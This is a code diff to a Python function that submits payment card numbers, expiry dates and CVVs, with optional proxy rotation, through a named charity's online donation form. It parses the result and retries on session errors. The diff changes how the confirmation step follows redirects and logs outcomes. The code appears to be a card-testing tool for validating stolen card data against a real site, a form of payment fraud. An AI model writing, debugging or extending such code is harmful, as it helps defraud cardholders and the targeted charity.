@@ -396,6 +396,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 if confirm_action:
                     confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
 
+                # FORCE URL CONFIRMATION SUPAYA SEMPURNA
                 if '?' in confirm_post_url:
                     if '_qf_Confirm_display=true' not in confirm_post_url:
                         confirm_post_url += '&_qf_Confirm_display=true'
@@ -409,36 +410,13 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 })
 
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
+                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                 
-                # BUANG allow_redirects=True SUPAYA DIA TAK HILANG CONTEXT
-                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=False)
+                logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                 
-                # IKUT REDIRECT SECARA MANUAL UNTUK TANGKAP PAGE MAIN_DISPLAY
-                if confirm_response.status_code in [301, 302, 303, 307, 308]:
-                    redirect_url = confirm_response.headers.get('Location')
-                    if redirect_url:
-                        if not redirect_url.startswith('http'):
-                            redirect_url = urljoin("https://www.saharaaa.org", redirect_url)
-                        
-                        logging.info(f"URL Redirect Selepas Submit Kedua: {redirect_url}")
-                        
-                        session.headers.update({
-                            "Referer": confirm_post_url
-                        })
-                        final_response = session.get(redirect_url, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
-                        
-                        logging.info(f"URL Final Selepas Redirect: {final_response.url}")
-                        result = parse_response(final_response.text, final_response.url)
-                    else:
-                        result = parse_response(confirm_response.text, confirm_response.url)
-                else:
-                    result = parse_response(confirm_response.text, confirm_response.url)
+                result = parse_response(confirm_response.text, confirm_response.url)
             else:
                 result = parse_response(response.text, response.url)
-            
-            # Tambah log untuk track error
-            if result.get('has_msg'):
-                logging.info(f"Error dikesan: {result.get('message')}")
             
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                 if attempt < 2:
